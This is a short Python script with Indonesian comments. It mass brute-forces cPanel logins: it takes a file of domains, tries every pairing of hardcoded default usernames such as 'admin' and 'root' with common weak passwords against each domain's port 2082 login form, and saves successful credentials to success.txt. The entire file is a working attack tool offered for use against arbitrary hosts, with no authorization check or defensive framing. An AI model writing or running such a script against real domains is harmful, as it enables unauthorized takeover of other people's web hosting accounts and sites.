import sys
import requests
import itertools

# Daftar username dan password
usernames = ["admin", "root", "cpanel", "user", "webmaster"]
passwords = ["admin123", "password123", "cpanel2024", "hosting123", "qwerty2024"]

# Fungsi untuk memeriksa login cPanel
def check_cpanel_login(domain, username, password):
    try:
        url = f"http://{domain}:2082/login"  # Sesuaikan port jika perlu (2083 untuk HTTPS)
        data = {'user': username, 'pass': password}
        
        response = requests.post(url, data=data, timeout=10)
        
        # Logika validasi berdasarkan respon
        if "redirect" in response.url:
            print(f"[SUCCESS] {domain} | {username}:{password}")
            with open('success.txt', 'a') as f:
                f.write(f"{domain}|{username}|{password}\n")
        else:
            print(f"[FAILED] {domain} | {username}")
    except Exception as e:
        print(f"[ERROR] {domain} - {str(e)}")

# Membaca daftar domain dari file
def load_domains(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f.readlines()]

# Fungsi utama
def main():
    if len(sys.argv) != 2:
        print("Penggunaan: python file.py <listdomain.txt>")
        sys.exit(1)
    
    domain_file = sys.argv[1]
    domains = load_domains(domain_file)
    
    # Membuat semua kombinasi username dan password
    for domain in domains:
        for username, password in itertools.product(usernames, passwords):
            check_cpanel_login(domain, username, password)

# Menjalankan fungsi utama
if __name__ == "__main__":
    main()
